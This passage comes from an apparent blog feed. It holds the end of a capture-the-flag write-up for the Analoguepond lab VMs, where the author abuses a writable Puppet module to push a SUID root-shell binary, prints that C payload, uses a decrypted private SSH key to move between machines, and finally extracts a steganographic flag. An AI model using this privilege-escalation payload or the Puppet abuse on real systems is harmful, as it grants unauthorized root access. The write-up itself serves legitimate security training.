</span><span class='line'>  content =&gt; "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCTPnm+I5zEPNUHc1PgmsIxK8XCvtRECY6nTFOdNL3CxVBepWLv0wgPWBIUAkP9nfPUshXo1EIjcvb0+RGtJ8KNbVK4vW2ZCwgNicUoYnCcVtSrGtz9oAnKpeGcCKAuHG6ybt4Opxe75eF4dZt2/aDRrPMw8PK8l8a3o9ZdJlIgdLiWORPiga/zUu1zuySkQPFHzPBp29MvWVwAYsssEjcXINfuvysPbdBzMJaJ2o4jmFV9g/uCz3xjRi9zULP1VpoRYtZUQadU2CpuN1RtVDeoSeYVe6vYkeLz6rCBQTUfi9Nea4X1JtvaTfnrquRMWOr43WnMMcdFpIsBd8oCI4jH root@puppet",
</span><span class='line'>  }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Another interesting module is the <em>wiggle</em> one, that references a binary called <em>spin</em> that needs to be present in /tmp, and when puppet runs it will change its ownership to root and make it SUID:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sandieshaw@puppet:/etc/puppet/modules$ cat wiggle/manifests/init.pp
</span><span class='line'>## My first puppet module by Nick Leeson (C) Barringsbank
</span><span class='line'>## Put spin binary in /tmp to confirm puppet is working
</span><span class='line'>class wiggle {
</span><span class='line'>
</span><span class='line'>file { [ "/tmp/spin" ]:
</span><span class='line'>  ensure  =&gt; present,
</span><span class='line'>  mode    =&gt; 4755,
</span><span class='line'>  owner   =&gt; root,
</span><span class='line'>  group   =&gt; root,
</span><span class='line'>  source  =&gt; "puppet:///modules/wiggle/spin";
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>This module looks like the way in for privilege escalation. You can find the spin binary and its source code inside <em>/etc/puppet/modules/wiggle/files</em>, it just spins the cursor and outputs a character out of a list. Not too useful, but our sandieshaw user is the owner and has write permissions over it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sandieshaw@puppet:/etc/puppet/modules/wiggle/files$ ls -l
</span><span class='line'>total 724
</span><span class='line'>-rwxrwxr-x 1 sandieshaw sandieshaw 733480 Dec 21  2016 spin
</span><span class='line'>-rw-rw-r-- 1 sandieshaw sandieshaw    376 Dec 17  2016 spin.c</span></code></pre></td></tr></table></div></figure>


<p>In order to exploit this, I created a malicious spin executable with a SUID shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then I copied it to the box:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>scp spin eric@192.168.159.136:/home/eric</span></code></pre></td></tr></table></div></figure>


<p>Next I transferred it to the puppet VM:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>eric@analoguepond:~$ scp spin sandieshaw@192.168.122.2:/etc/puppet/modules/wiggle/files/spin
</span><span class='line'>sandieshaw@puppet:/etc/puppet/modules/wiggle/files$ ls -l spin
</span><span class='line'>-rwxrwxr-x 1 sandieshaw sandieshaw 16712 May 29 15:42 spin</span></code></pre></td></tr></table></div></figure>


<p>The next time the puppet agent runs, it puts the malicious spin binary in /tmp and makes it SUID root:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -l /tmp
</span><span class='line'>total 20
</span><span class='line'>-rwsr-xr-x 1 root root 16712 May 29 15:43 spin</span></code></pre></td></tr></table></div></figure>


<p>We are now able to become root:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sandieshaw@puppet:~$ /tmp/spin
</span><span class='line'># ls /root
</span><span class='line'>protovision</span></code></pre></td></tr></table></div></figure>


<p>Inside /root/protovision we find some files and a hidden directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># ls -alh
</span><span class='line'>total 24K
</span><span class='line'>drwxr-xr-x 3 root root 4.0K Dec 21  2016 .
</span><span class='line'>drwx------ 4 root root 4.0K Jan  7  2017 ..
</span><span class='line'>-rw-r--r-- 1 root root  401 Dec 21  2016 flag1.txt.0xff
</span><span class='line'>drwxr-xr-x 3 root root 4.0K Dec 21  2016 .I_have_you_now
</span><span class='line'>-rw-r--r-- 1 root root   39 Dec 17  2016 jim
</span><span class='line'>-rw-r--r-- 1 root root   53 Dec 17  2016 melvin</span></code></pre></td></tr></table></div></figure>


<p>Checking the flag first:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat flag1.txt.0xff
</span><span class='line'>3d3d674c7534795a756c476130565762764e4849793947496c4a585a6f5248496b4a3362334e3363684248496842435a756c6d5a675148616e6c5762675533623542434c756c47497a564764313557617442794d79415362764a6e5a674d585a7446325a79463256676732593046326467777961793932646751334a754e585a765247497a6c47613042695a4a4279615535454d70647a614b706b5a48316a642f67325930463264763032626a35535a6956486431395765756333643339794c364d486330524861</span></code></pre></td></tr></table></div></figure>


<p>This hex string is decoded to a revere base64 string:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>==gLu4yZulGa0VWbvNHIy9GIlJXZoRHIkJ3b3N3chBHIhBCZulmZgQHanlWbgU3b5BCLulGIzVGd15WatByMyASbvJnZgMXZtF2ZyF2Vgg2Y0F2dgwyay92dgQ3JuNXZvRGIzlGa0BiZJByaU5EMpdzaKpkZH1jd/g2Y0F2dv02bj5SZiVHd19Weuc3d39yL6MHc0RHa</span></code></pre></td></tr></table></div></figure>


<p>I reversed it and decoded it for this hint:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>https://www.youtube.com/watch?v=GfJJk7i0NTk If this doesn't work, watch Wargames from 23 minutes in, you might find a password there or something...</span></code></pre></td></tr></table></div></figure>


<p>Watching the clip, the interesting line is the shouted &ldquo;Backdoors are not secrets&rdquo;. This is confirmed by the jim and melvin files:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat jim
</span><span class='line'>Mr Potato Head! Backdoors are not a...
</span><span class='line'># cat melvin
</span><span class='line'>Boy you guys are dumb! I got this all figured out...</span></code></pre></td></tr></table></div></figure>


<p>Inside the hidden folder we find a picture and another hidden folder:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>drwxr-xr-x 3 root root 4.0K Dec 18  2016 .a
</span><span class='line'>-r-------- 1 root root  71K Dec 18  2016 grauniad_1995-02-27.jpeg</span></code></pre></td></tr></table></div></figure>


<p>The picture states that Barings Bank goes bust. The hidden folder goes on with another and another so I enumerated all:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># find . -type d
</span><span class='line'>.
</span><span class='line'>./.a
</span><span class='line'>./.a/.b
</span><span class='line'>./.a/.b/.c
</span><span class='line'>./.a/.b/.c/.d
</span><span class='line'>./.a/.b/.c/.d/.e
</span><span class='line'>./.a/.b/.c/.d/.e/.f
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u.
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v.
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w.
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w./x.
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w./x./y
</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w./x./y/.z</span></code></pre></td></tr></table></div></figure>


<p>All the way down, we find 2 files:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># ls
</span><span class='line'>my_world_you_are_persistent_try  nleeson_key.gpg</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what we have here:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat my_world_you_are_persistent_try
</span><span class='line'>joshua</span></code></pre></td></tr></table></div></figure>


<p>Might be a password for something later. The other file is related to the nleeson user we found on the other VM a while ago. I tried to decrypt it with the password <em>secrets</em>, but it didn&rsquo;t work. But the hint in the jim file was referring to a secret, so I tried <code>secret</code> and it decrypted a private SSH key for nleeson:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># gpg -d nleeson_key.gpg
</span><span class='line'>gpg: CAST5 encrypted data
</span><span class='line'>gpg: gpg-agent is not available in this session
</span><span class='line'>gpg: encrypted with 1 passphrase
</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>Proc-Type: 4,ENCRYPTED
</span><span class='line'>DEK-Info: AES-128-CBC,1864E0393453C88F778D5E02717B8B16
</span><span class='line'>
</span><span class='line'>RTSpHZnf1Onpy3OHfSat0Bzbrx8wd6EBKlbdZiGjEB0AC4O0ylrSBoWsEJ/loSL8
</span><span class='line'>jdTbcSG0/GWJU7CS5AQdK7KctWwqnOHe9y4V15gtZcfgxNLrVfMUVAurZ3n2wQqK
</span><span class='line'>ARmqBXhftPft8EBBAwWwQmBrD+ufF2uaJoKr4Bfu0zMFQxRnNDooBes5wyNO/7k6
</span><span class='line'>osvGqTEX/xwJG1GB5X0jsDCmBH4WXhafa0nzZXvd2Pd3UpaWPEgyq3vxIQaredR8
</span><span class='line'>VbJbPSeKypTIj3UyEj+kjczhCiWw9t0Mv0aV4FtMOesnDQYJskL8kSLGRkN+7lHD
</span><span class='line'>IcHz7az9oqYGBSq77lPkmk7oIpT/pg80pfCyHExROwlTRPzVRHv7KGiKd35R0Hl9
</span><span class='line'>7CUQPCjH5ltQW4B6XUmxmoT8N14w5HOxb/JlV7s2g6dXYT0azOeqDsGivpgMY3vy
</span><span class='line'>rtVakLIsZeYaZYSr6WvTFclXWYctYPMgzRewiRPjyn6DXiD6MtCJZj2CqJ47tP37
</span><span class='line'>eRRgRRH6a1Sm/BkfSPIXlV0tTpOXfjtHG7VoIc5X343GL/WHM/nhNFvMLdRnVXRM
</span><span class='line'>YOEKAsYklBLqZ99btTESwJZt9HG/cGpQrbgFwxKPoJy7f5wNLOa1ZhpDyw1IqokO
</span><span class='line'>Pq4r8zZj4ASyg3gl7ByG11C272mkMG8yiIwOckVgNec/se18PUGBw1HHgRuyzDym
</span><span class='line'>/6/cwkDzoJlResjsNDQCQcNzSOoZxi3GFIIiB+HjG84MF+ofnn3ayaUZLUaBbPMJ
</span><span class='line'>jQ7dP6wqIMYwY5ZM6nRQ+RnL6QVBHnXH9RjmbzdVMzmQDjPS0lOg5xkU8B78vG6e
</span><span class='line'>lphvmlLSM+PFVOqPwhVB8yon97aU23npKIOPu44VsUXU0auKI94qoX0I1EDDQFrE
</span><span class='line'>UqpWUpCCHrRRTZCdnnE6RnJZ+rjGPvFA95lhUp1fpF8l4U3a8qKlsdtWmzYxHdyg
</span><span class='line'>+w0QE8VdDsNqgCP7W6KzvN5E5HJ0bbQasadAX5eDd6I94V0fCZrPlzM+5CAXH4E4
</span><span class='line'>qhmWQPCw7Q1CnW61yG8e9uD1W7yptK5NyZpHHkUbZGIS+P7EZtS99zDPh3V4N7I2
</span><span class='line'>Mryzxkmi2JyQzf4T1cfK7JTdIC2ULGmFZM26BX3UCV0K+9OOGgRDPU4noS0gNHxP
</span><span class='line'>VaWVmjGgubE4GDlW0tgw1ET+LaUdAv/LE+3gghpRLn1imdaW9elnIeaVeOWcyrBC
</span><span class='line'>Ypl8AjYXNRd0uLWBC8xbakmK1tZUPXwefqjQpKjuIuYmmVes3M4DFxGQajmK03nO
</span><span class='line'>oGaByHu0RVjy0x/zBuOuOp6eKpeaiLWfLM5DSIWlksL/2dmAloSs3LrIPu4dTnRb
</span><span class='line'>v2YQ+72nLI62alLEaKwXUBoHSSRNTv0hbOyvV8YUp4EmJ8yShAmEE/n9Et62BwYB
</span><span class='line'>rsi0RhEfih+43PzlwB91I4Elr2k3eBwQ9XiF3KdVgj6wvwqNLZ7aC5YpLcYaVyNT
</span><span class='line'>fKzUxX02Ejvo60xWJ8u6GIhUK404s2WVeG/PCLwtrKGjpyPCn3yCWpCWpGPuVNrx
</span><span class='line'>Wg0Um581e4Vw5CLDL5hRLmo7wiqssuL3/Uugf/lc2vF+MxJyoI1F9Zkt2xvRYrLB
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span><span class='line'>gpg: WARNING: message was not integrity protected</span></code></pre></td></tr></table></div></figure>


<p>I extracted the private key and used it to SSH to the other VM as nleeson. It asked for a passphrase, and I used <em>joshua</em> from the file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gpg nleeson_key.gpg &gt; nleeson_key
</span><span class='line'>chmod 600 nleeson
</span><span class='line'># ssh -i nleeson nleeson@192.168.122.3
</span><span class='line'>Enter passphrase for key 'nleeson':
</span><span class='line'>Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 4.4.0-57-generic x86_64)
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'> System information disabled due to load higher than 1.0
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.
</span><span class='line'>
</span><span class='line'>nleeson@barringsbank:~$</span></code></pre></td></tr></table></div></figure>


<h2>Rooting barringsbank</h2>

<p>Inside nleeson&rsquo;s home there&rsquo;s nothing interesting. I found another reticulatingsplines picture like in eric&rsquo;s home. There wasn&rsquo;t anything exploitable around, but we know that Puppet is pushing configuration changes from the puppet VM. With my root privileges in that VM, I edited the <strong>nodes.pp</strong> and <strong>site.pp</strong> files in <code>/etc/puppet/manifests</code> to include the wiggle module on barringsbank as well:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>node 'barringsbank.example.com' inherits 'default' {
</span><span class='line'>  include wiggle
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<p>If you&rsquo;re wondering how long you have to wait for Puppet changes to propagate over the nodes, there&rsquo;s a cron job that runs every 10 minutes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Puppet Name: puppet check in
</span><span class='line'>*/10 * * * * /usr/bin/puppet agent --test &gt; /dev/null 2&gt;&1</span></code></pre></td></tr></table></div></figure>


<p>Nothing&rsquo;s stopping us from running the agent though. Whichever way you choose, the spin binary will now appear in /tmp on barringsbank, and that&rsquo;s another root:</p>

<p>Inside /root there&rsquo;s an image owned by nleeson that I transferred all the way back to my machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-rw-r--  1 nleeson nleeson 215K Dec 21  2016 me.jpeg</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/analoguepond/me.jpeg" title="final flag" alt="final flag"></p>

<h2>Final flag</h2>

<p>Checking for embedded data on the image, we&rsquo;re being asked for a passphrase. I&rsquo;ve used all the hints, tried extrabacon as well..but remember the 2 cow pictures called reticulatingsplines found on 2 separate machines. Trying that as the passphrase worked:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>steghide info me.jpeg
</span><span class='line'>"me.jpeg":
</span><span class='line'>  format: jpeg
</span><span class='line'>  capacity: 11.9 KB
</span><span class='line'>Try to get information about embedded data ? (y/n) y
</span><span class='line'>Enter passphrase:
</span><span class='line'>  embedded file "primate_egyptian_flag.txt":
</span><span class='line'>    size: 3.7 KB
</span><span class='line'>    encrypted: rijndael-128, cbc
</span><span class='line'>    compressed: yes</span></code></pre></td></tr></table></div></figure>


<p>I then extracted the file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>steghide extract -sf me.jpeg
</span><span class='line'>Enter passphrase:
</span><span class='line'>wrote extracted data to "primate_egyptian_flag.txt".</span></code></pre></td></tr></table></div></figure>


<p>A big hex string that gets decoded to another reversed Base64 string. I used the CLI to decode the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat primate_egyptian_flag.txt | xxd -p -r | rev | base64 -d
</span><span class='line'>
</span><span class='line'>Here's a fender bass for you...
</span><span class='line'>
</span><span class='line'>                                  ,-.        _.---._
</span><span class='line'>                                |  `\.__.-''       `.
</span><span class='line'>                                 \  _        _  ,.   \
</span><span class='line'>           ,+++=._________________)_||______|_|_||    |
</span><span class='line'>          (_.ooo.===================||======|=|=||    |
</span><span class='line'>             ~~'                 |  ~'      `~' o o  /
</span><span class='line'>                                  \   /~`\     o o  /
</span><span class='line'>                                   `~'    `-.____.-'
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Congratulations to you once again and for the sixth time on capturing this
</span><span class='line'>flag!
</span><span class='line'>
</span><span class='line'>I've tried to mix things up a bit here, to move away from throw metasploit
</span><span class='line'>and web exploits at things. I hope you have enjoyed that portion and your
</span><span class='line'>feedback on this aspect would be appreciated.
</span><span class='line'>
</span><span class='line'>Of note, these VMs are set to do automatic security updates using puppet,
</span><span class='line'>so this ought to keep things dynamic enough for people.
</span><span class='line'>
</span><span class='line'>Many thanks to mrB3n, Rand0mByteZ and kevinnz for testing this CTF.
</span><span class='line'>
</span><span class='line'>A special thank you to g0tmi1k for hosting all these challenges and the
</span><span class='line'>valuable advice. A tip of the hat to mrb3n for his recent assistance. Hit
</span><span class='line'>me on IRC or twitter if you are looking for a hint or have completed the
</span><span class='line'>challenge.
</span><span class='line'>
</span><span class='line'>Go on, Complete the circle: 06:30 to 07:45 of episode #1 of Our Friends In
</span><span class='line'>The North (C) BBC 1995.. What's the connection....?
</span><span class='line'>                                                           --Knightmare</span></code></pre></td></tr></table></div></figure>


<p>This was another excellent machine by Knightmare! Using puppet for exploitation was a new and exciting way to pwn the box.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>_______________________________________
</span><span class='line'>/ Communicate! It can't make things any \
</span><span class='line'>\ worse.                                /
</span><span class='line'>---------------------------------------
</span><span class='line'>       \   ^__^
</span><span class='line'>        \  (oo)\_______
</span><span class='line'>           (__)\       )\/\
</span><span class='line'>               ||----w |
</span><span class='line'>               ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Derpnstink]]></title>
    <link href="http://chousensha.github.io/blog/2019/05/19/derpnstink/"/>
    <updated>2019-05-19T20:36:18+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/05/19/derpnstink</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s VM is inspired from the OSCP labs and it has 4 flags to collect.</p>

<blockquote><p>Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified  professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live&hellip;</p></blockquote>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ORT   STATE SERVICE VERSION
</span><span class='line'>21/tcp open  ftp     vsftpd 3.0.2
